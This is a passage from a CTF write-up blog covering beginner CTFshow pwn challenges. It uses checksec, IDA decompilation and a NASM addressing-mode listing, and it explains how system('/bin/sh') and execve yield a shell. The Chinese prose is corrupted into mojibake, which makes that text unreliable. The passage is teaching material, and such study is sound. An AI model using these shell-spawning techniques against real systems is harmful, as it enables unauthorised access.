	height="246"
	srcset="/p/ctfshow-pwn-writeup/3_hu_e6fbe5354a4e4e53.png 480w, /p/ctfshow-pwn-writeup/3_hu_9234984ec0f35806.png 1024w"
	loading="lazy"
	
		alt="checksecè§£æelfæ ¼å¼ä¿¡æ¯ã€äºŒè¿›åˆ¶æ–‡ä»¶ä¿æŠ¤é…ç½®"
	
	
		class="gallery-image" 
		data-flex-grow="410"
		data-flex-basis="985px"
	
></p>
<p>ä¸è¿‡æˆ‘ç”¨äº†ä¸‹åˆšå­¦çš„æŒ‡ä»¤checksecçœ‹äº†çœ‹ELFæ–‡ä»¶ä¿¡æ¯ï¼Œå‘ç°æ˜¯æ²¡å¼€canaryä¿æŠ¤çš„ï¼Œå¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´&hellip;</p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯64ä½ä»…å…³é—­Canaryä¿æŠ¤ã€‚</p>
<p>æ¥ç€ç”¨64ä½IDAæ‰“å¼€æŸ¥çœ‹mainå‡½æ•°ï¼ˆæŒ‰F5è¿›å…¥åæ±‡ç¼–ï¼‰ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/4.png"
	width="1375"
	height="790"
	srcset="/p/ctfshow-pwn-writeup/4_hu_2ae06a810be6f21f.png 480w, /p/ctfshow-pwn-writeup/4_hu_8b6f5df4cd345cc8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="174"
		data-flex-basis="417px"
	
></p>
<p>æ€ªä¸å¾—ç›´æ¥çˆ†flagå‡ºæ¥å‘¢ã€‚åé—¨systemå‡½æ•°ç›´æ¥è¿è¡Œäº†ã€‚</p>
<h3 id="pwn_002">PWN_002
</h3><p>é¢˜ç›®ï¼š <a class="link" href="PWN_002" >PWN_002</a> ç»™ä½ ä¸€ä¸ªshellï¼Œè¿™æ¬¡éœ€è¦ä½ è‡ªå·±å»è·å¾—flag</p>
<p>åˆ°è¿™é‡Œåº¦è¿‡æ–°æ‰‹æœŸäº†ã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/5.png"
	width="765"
	height="260"
	srcset="/p/ctfshow-pwn-writeup/5_hu_e343e2a59c5e743.png 480w, /p/ctfshow-pwn-writeup/5_hu_4937eed7794a387b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="294"
		data-flex-basis="706px"
	
></p>
<p>è¿™é‡Œéœ€è¦æˆ‘ä»¬è¾“å…¥æŒ‡ä»¤äº†ï¼Œä¸€èˆ¬æ¥è¯´åšé¢˜ä¹ æƒ¯çœ‹åˆ°è¿™æ ·ç›´æ¥lsç§’çš„ï¼Œä¸è¿‡åƒæˆ‘è¿™æ ·å…¥é—¨çº§åˆ«çš„è¿˜å¾—ç”¨IDAç¢ç£¨ç¢ç£¨ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/8.png"
	width="640"
	height="160"
	srcset="/p/ctfshow-pwn-writeup/8_hu_5bc43d6c8900b4ef.png 480w, /p/ctfshow-pwn-writeup/8_hu_e468d492633fbadf.png 1024w"
	loading="lazy"
	
		alt="checksecåˆ†æ"
	
	
		class="gallery-image" 
		data-flex-grow="400"
		data-flex-basis="960px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/6.png"
	width="1374"
	height="555"
	srcset="/p/ctfshow-pwn-writeup/6_hu_540555b971908944.png 480w, /p/ctfshow-pwn-writeup/6_hu_a88e21f83ae2c018.png 1024w"
	loading="lazy"
	
		alt="IDA-x64ä½mainç¨‹åºçš„åç¼–è¯‘"
	
	
		class="gallery-image" 
		data-flex-grow="247"
		data-flex-basis="594px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯æ²¡canaryä¿æŠ¤çš„</p>
<p><img src="/p/ctfshow-pwn-writeup/7.png"
	width="909"
	height="484"
	srcset="/p/ctfshow-pwn-writeup/7_hu_6dedf0753937e2ce.png 480w, /p/ctfshow-pwn-writeup/7_hu_4bed3d833e192498.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="450px"
	
></p>
<p>çœ‹åˆ°è¿™é‡Œæœ‰ä¸ªç–‘é—®ï¼Œä¸ºä»€ä¹ˆsystemæœ‰è¿™ä¹ˆå¤§å¨åŠ›ï¼Ÿï¼Œè¿™æ¬¡systemé‡Œè¾¹æ˜¯ä¸€ä¸ª/bin/shçš„è½¯é“¾æ¥ï¼Œå¾ˆç±»ä¼¼æˆ‘ä»¬çš„æ–‡ä»¶åœ°å€</p>
<blockquote class="alert alert-note">
    <blockquote>
<p><code>system(&quot;/bin/sh&quot;);</code> æ˜¯æ¼æ´åˆ©ç”¨ä¸­è·å–ç³»ç»Ÿ shell çš„æ ¸å¿ƒæ“ä½œï¼Œå…¶å·¥ä½œåŸç†æ¶‰åŠ<strong>å‡½æ•°è°ƒç”¨</strong>ã€<strong>ç³»ç»Ÿè°ƒç”¨</strong>å’Œ<strong>è¿›ç¨‹åˆ›å»º</strong>ä¸‰ä¸ªå±‚æ¬¡ï¼Œæœ¬è´¨æ˜¯é€šè¿‡æ ‡å‡†åº“å‡½æ•° <code>system</code> å¯åŠ¨ä¸€ä¸ª <code>/bin/sh</code> è¿›ç¨‹ï¼ˆå³å‘½ä»¤è¡Œè§£é‡Šå™¨ï¼‰ï¼Œè®©æ”»å‡»è€…è·å¾—äº¤äº’æƒé™ã€‚</p></blockquote></blockquote>
<p><code>system</code> æ˜¯ C æ ‡å‡†åº“ï¼ˆlibcï¼‰ä¸­çš„å‡½æ•°ï¼ŒåŸå‹ä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">system</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">command</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote class="alert alert-error">
    <blockquote>
<p>å®ƒçš„åŠŸèƒ½æ˜¯<strong>æ‰§è¡Œå‚æ•° <code>command</code> æŒ‡å‘çš„å­—ç¬¦ä¸²ä½œä¸ºç³»ç»Ÿå‘½ä»¤</strong>ï¼Œç›¸å½“äºåœ¨ç»ˆç«¯ä¸­è¾“å…¥è¯¥å‘½ä»¤å¹¶æ‰§è¡Œã€‚</p></blockquote></blockquote>
<p>system()å‡½æ•°å…ˆforkä¸€ä¸ªå­è¿›ç¨‹ï¼Œåœ¨è¿™ä¸ªå­è¿›ç¨‹ä¸­è°ƒç”¨/bin/sh -cæ¥æ‰§è¡ŒcommandæŒ‡å®šçš„å‘½ä»¤ã€‚/bin/shåœ¨ç³»ç»Ÿä¸­ä¸€èˆ¬æ˜¯ä¸ªè½¯é“¾æ¥ï¼ŒæŒ‡å‘dashæˆ–è€…bashç­‰å¸¸ç”¨çš„shellï¼Œ-cé€‰é¡¹æ˜¯å‘Šè¯‰shellä»å­—ç¬¦ä¸²commandä¸­è¯»å–è¦æ‰§è¡Œçš„å‘½ä»¤ï¼ˆshellå°†æ‰©å±•commandä¸­çš„ä»»ä½•ç‰¹æ®Šå­—ç¬¦ï¼‰ã€‚çˆ¶è¿›ç¨‹åˆ™è°ƒç”¨waitpid()å‡½æ•°æ¥ä¸ºå˜æˆåƒµå°¸çš„å­è¿›ç¨‹æ”¶å°¸ï¼Œè·å¾—å…¶ç»“æŸçŠ¶æ€ï¼Œç„¶åå°†è¿™ä¸ªç»“æŸçŠ¶æ€è¿”å›ç»™system()å‡½æ•°çš„è°ƒç”¨è€…ã€‚</p>
<blockquote class="alert alert-note">
    <blockquote>
<p><code>system(&quot;/bin/sh&quot;)</code> çš„å·¥ä½œåŸç†å¯ç®€åŒ–ä¸ºï¼š
<strong>é€šè¿‡ <code>system</code> å‡½æ•°åˆ›å»ºå­è¿›ç¨‹ â†’ å­è¿›ç¨‹æ‰§è¡Œ <code>/bin/sh</code> ç¨‹åº â†’ å¯åŠ¨äº¤äº’å¼ shell ç¯å¢ƒ</strong>ã€‚</p>
<p>è¿™ä¹Ÿæ˜¯æ¼æ´åˆ©ç”¨ä¸­æœ€å¸¸ç”¨çš„<strong>è·å–æƒé™</strong>çš„æ–¹å¼ â€”â€” æ— è®ºé€šè¿‡æ ˆæº¢å‡ºã€ROP è¿˜æ˜¯ ret2libcï¼Œæœ€ç»ˆç›®æ ‡éƒ½æ˜¯è®©ç¨‹åºæ‰§è¡Œè¿™æ¡è¯­å¥ï¼ˆæˆ–ç­‰æ•ˆçš„ç³»ç»Ÿè°ƒç”¨ï¼‰ã€‚</p></blockquote></blockquote>
<h3 id="pwn_003">PWN_003
</h3><p>é¢˜ç›®ï¼š <a class="link" href="PWN_003" >PWN_003</a> å“ªä¸€ä¸ªå‡½æ•°æ‰èƒ½è¯»å–flagï¼Ÿ</p>
<p><img src="/p/ctfshow-pwn-writeup/9.png"
	width="835"
	height="485"
	srcset="/p/ctfshow-pwn-writeup/9_hu_cf2d18ee43fc45c9.png 480w, /p/ctfshow-pwn-writeup/9_hu_4af22d79b2909177.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="172"
		data-flex-basis="413px"
	
></p>
<p>é€šè¿‡å‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥é€‰é¡¹â€6â€ä¸ºæˆ‘ä»¬æ‰€éœ€è¦çš„åé—¨å‡½æ•°ï¼Œå…¶ä»–çš„å‡ä¸ä¼šå¾—åˆ°æˆ‘ä»¬æ‰€æƒ³è¦çš„flagï¼Œåœ¨systemå‡½æ•°é‡Œé¢çš„å‘½ä»¤éƒ½æ˜¯åœ¨ç»ˆç«¯æ‰§è¡Œçš„ï¼Œèµ‹äºˆsystemæƒé™è¾ƒå¤§ï¼Œåœ¨æˆ‘æ‰€å†™çš„æ–‡ç« é‡Œï¼ŒåŒ…æ‹¬PWNå…¥é—¨çŸ¥è¯†è®²è§£å’Œæ“ä½œç³»ç»Ÿéƒ½æ˜ç¡®æŒ‡å‡ºSYSTEMæ˜¯ä¸æ“ä½œç³»ç»Ÿå†…æ ¸æ¥è§¦çš„ï¼Œæ¯”Administratorsçš„æƒé™è¿˜è¦ç¨å¤§ã€‚</p>
<p>ç›´æ¥é€‰6ç§’äº†ï¼Œä½†é™¤è¿™ç§é€åˆ†çš„ï¼Œå…¶å®è¿˜éœ€è¦ææ¸…è¿è¡Œçš„é€»è¾‘ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/10.png"
	width="1390"
	height="554"
	srcset="/p/ctfshow-pwn-writeup/10_hu_c9707c3fe7bf59e8.png 480w, /p/ctfshow-pwn-writeup/10_hu_b592fb61e24a27ee.png 1024w"
	loading="lazy"
	
		alt="IDAx64ä½ç¨‹åºåç¼–è¯‘"
	
	
		class="gallery-image" 
		data-flex-grow="250"
		data-flex-basis="602px"
	
></p>
<p>è·Ÿè¿›ä¸€ä¸‹menuå‡½æ•°é‡Œè¾¹ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/11.png"
	width="726"
	height="280"
	srcset="/p/ctfshow-pwn-writeup/11_hu_3d734164c38877e4.png 480w, /p/ctfshow-pwn-writeup/11_hu_685776f269a503fb.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="259"
		data-flex-basis="622px"
	
></p>
<p>å›åˆ°mainè·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªâ€œ6â€çš„å‡½æ•°ï¼Œçœ‹çœ‹é‡Œå¤´æ˜¯ä¸æ˜¯çœŸåœ¨æ‰§è¡Œsystemåé—¨å‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/12.png"
	width="744"
	height="240"
	srcset="/p/ctfshow-pwn-writeup/12_hu_9db861ef6fbcf71d.png 480w, /p/ctfshow-pwn-writeup/12_hu_9d996ee2d6fc5f89.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="310"
		data-flex-basis="744px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/13.png"
	width="501"
	height="119"
	srcset="/p/ctfshow-pwn-writeup/13_hu_b70d12fb710b2ef9.png 480w, /p/ctfshow-pwn-writeup/13_hu_c960f6a7ed96e8b6.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="421"
		data-flex-basis="1010px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œç¡®å®æ˜¯æ‰§è¡Œäº†ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå°±èƒ½å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„flagã€‚</p>
<h3 id="pwn_004">PWN_004
</h3><p>é¢˜ç›®ï¼š <a class="link" href="PWN_004" >PWN_004</a> æˆ–è®¸éœ€è¦å…ˆå¾—åˆ°æŸä¸ªç¥ç§˜å­—ç¬¦</p>
<p>çœŸå¤Ÿé˜´é—´çš„ï¼Œå•¥ä¹Ÿä¸ç»™äº†ï¼Œæ‰ç¬¬å‡ é“å•Šå°±ä¸Šå¼ºåº¦äº†ã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/14.png"
	width="1060"
	height="574"
	srcset="/p/ctfshow-pwn-writeup/14_hu_fb649637a5b6a11b.png 480w, /p/ctfshow-pwn-writeup/14_hu_c8ef954931f877ea.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="184"
		data-flex-basis="443px"
	
></p>
<p>checksecçœ‹çœ‹ï¼Œç„¶åIDAåç¼–è¯‘çœ‹çœ‹ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/15.png"
	width="481"
	height="159"
	srcset="/p/ctfshow-pwn-writeup/15_hu_5f0f4805cec82d66.png 480w, /p/ctfshow-pwn-writeup/15_hu_e21b6ee28222ffbe.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="302"
		data-flex-basis="726px"
	
></p>
<p>64ä½äºŒè¿›åˆ¶ä¿æŠ¤å…¨å¼€&hellip;</p>
<p><img src="/p/ctfshow-pwn-writeup/16.png"
	width="753"
	height="341"
	srcset="/p/ctfshow-pwn-writeup/16_hu_ca7b56f27f75a918.png 480w, /p/ctfshow-pwn-writeup/16_hu_6ad185fb146bb9a2.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="220"
		data-flex-basis="529px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªä¼¼æ›¾ç›¸è¯†çš„å‡½æ•°ï¼šstrcpyï¼ˆå¤åˆ¶å‡½æ•°æŠŠxxå¤åˆ¶ç»™s1ï¼Œä¹Ÿå¯èµ·åˆ°èµ‹å€¼çš„ä½œç”¨ï¼‰ã€strcmpï¼ˆæ¯”è¾ƒå‡½æ•°ï¼Œå¯¹æ¯”ï¼Œåˆ¤æ–­ä½œç”¨ï¼‰ã€execveï¼ˆï¼‰ï¼›æˆ‘æ›¾è¯´è¿‡æ±‡ç¼–è¯­è¨€çš„cmpå°±æœ‰æ¯”è¾ƒä½œç”¨ï¼Œè¿™ä¹Ÿç®—æ˜¯ç±»æ¯”å§ï¼Œå›æƒ³èµ·æ¥çš„ï¼Œä¸è¿‡ç”¨AIæœä¸€ä¸‹ä¹Ÿè¡Œã€‚</p>
<p>æ¥è¯´ä¸‹execveå§ï¼Œä¸Šé¢˜è®²è¿‡systemå‡½æ•°ï¼Œè¿™ä¸ªä¹Ÿåº”è¯¥çŸ¥é“çš„ï¼š</p>
<p><code>execve</code> æ˜¯ Unix/Linux ç³»ç»Ÿä¸­æœ€æ ¸å¿ƒçš„<strong>ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰</strong> ä¹‹ä¸€ï¼Œç”¨äº<strong>åœ¨å½“å‰è¿›ç¨‹ä¸­åŠ è½½å¹¶æ‰§è¡Œä¸€ä¸ªæ–°çš„ç¨‹åº</strong>ï¼Œæ›¿æ¢å½“å‰è¿›ç¨‹çš„ä»£ç ã€æ•°æ®å’Œå †æ ˆï¼Œå®ç°è¿›ç¨‹ â€œå˜èº«â€ã€‚å®ƒæ˜¯æ‰€æœ‰ç¨‹åºå¯åŠ¨å’Œæ›¿æ¢çš„åº•å±‚åŸºç¡€ï¼ŒåŒ…æ‹¬ <code>system</code> å‡½æ•°ã€shell æ‰§è¡Œå‘½ä»¤ç­‰æœ€ç»ˆéƒ½ä¼šä¾èµ– <code>execve</code> å®Œæˆã€‚</p>
<p>çœ‹åˆ°è¿™æ®µä»£ç ï¼Œå¤§è‡´æ„æ€æ˜¯ï¼Œè®©s1ç­‰äºâ€œCTFshowPWNâ€è¿™æ®µå­—ç¬¦ä¸²ï¼Œç„¶ååˆ°ifåˆ¤æ–­è¯­å¥è¿™è¿›è¡Œæ¯”è¾ƒï¼š<strong>å¦‚æœs1å’Œs2ç›¸ç­‰</strong>ï¼ˆè¿™é‡Œçš„ï¼ä¸æ˜¯æˆ‘ä»¬Cè¯­è¨€ä¸­çš„â€œä¸â€çš„æ„æ€å•Šï¼‰ï¼Œå°±æ‰§è¡Œexecveå‡½æ•°ï¼Œå¯åŠ¨äº¤äº’æƒé™ï¼Œä»è€Œå¾—åˆ°flagã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/17.png"
	width="890"
	height="506"
	srcset="/p/ctfshow-pwn-writeup/17_hu_cb606be9be72c140.png 480w, /p/ctfshow-pwn-writeup/17_hu_e8a05d11d9a5f65f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="175"
		data-flex-basis="422px"
	
></p>
<p>è‡³æ­¤ï¼šä¸‹ä¸€èŠ‚å°±å¼€å§‹å‰ç½®åŸºç¡€äº†ï¼Œå¼€å§‹åº”ç”¨<a class="link" href="https://expl0rer.top/p/pwn-1/"  target="_blank" rel="noopener"
    >PWN-1</a>ã€<a class="link" href="https://expl0rer.top/p/pwn-2/"  target="_blank" rel="noopener"
    >PWN-2</a>ã€<a class="link" href="https://expl0rer.top/p/pwn-3/"  target="_blank" rel="noopener"
    >PWN-3</a>æ‰€å­¦çš„çŸ¥è¯†äº†ã€‚</p>
<h2 id="å‰ç½®åŸºç¡€">å‰ç½®åŸºç¡€
</h2><h3 id="pwn_005">PWN_005
</h3><p>é¢˜ç›®ï¼šè¿è¡Œæ­¤æ–‡ä»¶ï¼Œå°†å¾—åˆ°çš„å­—ç¬¦ä¸²ä»¥ctfshow{xxxxx}æäº¤ã€‚</p>
<p>å¦‚ï¼šè¿è¡Œæ–‡ä»¶å è¾“å‡ºçš„å†…å®¹ä¸º Hello_World</p>
<p>æäº¤çš„flagå€¼ä¸ºï¼šctfshow{Hello_World}</p>
<p><strong>æ³¨ï¼šè®¡ç»„åŸç†é¢˜å‹åç»­çš„flagä¸­åœ°å€å­—æ¯å¤§å†™</strong></p>
<p><a class="link" href="PWN_005%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_005%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<p>Welcome_to_CTFshow.asmæ–‡æœ¬æ‰“å¼€åå‘ç°æ˜¯æ±‡ç¼–è¯­è¨€æ–‡ä»¶ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="k">section</span> <span class="nv">.data</span>
</span></span><span class="line"><span class="cl">    <span class="nf">msg</span> <span class="nv">db</span> <span class="s">&#34;Welcome_to_CTFshow_PWN&#34;</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">section</span> <span class="nv">.text</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">_start</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">_start:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; ç«‹å³å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">11</span>         <span class="c1">; å°†11èµ‹å€¼ç»™eax</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">114504</span>     <span class="c1">; eaxåŠ ä¸Š114504</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; eaxå‡å»1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; å¯„å­˜å™¨å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x36d</span>      <span class="c1">; å°†0x36dèµ‹å€¼ç»™ebx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>        <span class="c1">; å°†ebxçš„å€¼èµ‹å€¼ç»™edx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; ç›´æ¥å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>      <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; å¯„å­˜å™¨é—´æ¥å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™esi</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>      <span class="c1">; å°†esiæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; å¯„å­˜å™¨ç›¸å¯¹å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">4</span>          <span class="c1">; å°†ecxåŠ ä¸Š4</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">]</span>      <span class="c1">; å°†ecxæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; åŸºå€å˜å€å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">2</span>          <span class="c1">; å°†2èµ‹å€¼ç»™edx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="nb">edx</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span>  <span class="c1">; å°†ecx+edx*2æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; ç›¸å¯¹åŸºå€å˜å€å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; å°†1èµ‹å€¼ç»™edx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">8</span>          <span class="c1">; å°†ecxåŠ ä¸Š8</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="nb">edx</span><span class="o">*</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">6</span><span class="p">]</span>  <span class="c1">; å°†ecx+edx*2-6æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; è¾“å‡ºå­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">4</span>          <span class="c1">; ç³»ç»Ÿè°ƒç”¨å·4ä»£è¡¨è¾“å‡ºå­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; æ–‡ä»¶æè¿°ç¬¦1ä»£è¡¨æ ‡å‡†è¾“å‡º</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„åœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">22</span>         <span class="c1">; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„é•¿åº¦</span>
</span></span><span class="line"><span class="cl">    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; è°ƒç”¨ç³»ç»Ÿè°ƒç”¨</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; é€€å‡ºç¨‹åº</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; ç³»ç»Ÿè°ƒç”¨å·1ä»£è¡¨é€€å‡ºç¨‹åº</span>
</span></span><span class="line"><span class="cl">    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>        <span class="c1">; è¿”å›å€¼ä¸º0</span>
</span></span><span class="line"><span class="cl">    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; è°ƒç”¨ç³»ç»Ÿè°ƒç”¨</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>checksecä¸€ä¸‹è¿™ä¸ªPWNæ–‡ä»¶ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/18.png"
	width="560"
	height="160"
	srcset="/p/ctfshow-pwn-writeup/18_hu_b88e80be1380d264.png 480w, /p/ctfshow-pwn-writeup/18_hu_edb93148c7d1aae7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="350"
		data-flex-basis="840px"
	
></p>
<p>ohohè¿™ä¸ªä¿æŠ¤å…¨å…³çš„ï¼IDAçš„x32ä½</p>
<p><img src="/p/ctfshow-pwn-writeup/19.png"
	width="986"
	height="270"
	srcset="/p/ctfshow-pwn-writeup/19_hu_5a1e69eadca2a8dd.png 480w, /p/ctfshow-pwn-writeup/19_hu_94c08c2f6f98fd2d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="365"
		data-flex-basis="876px"
	
></p>
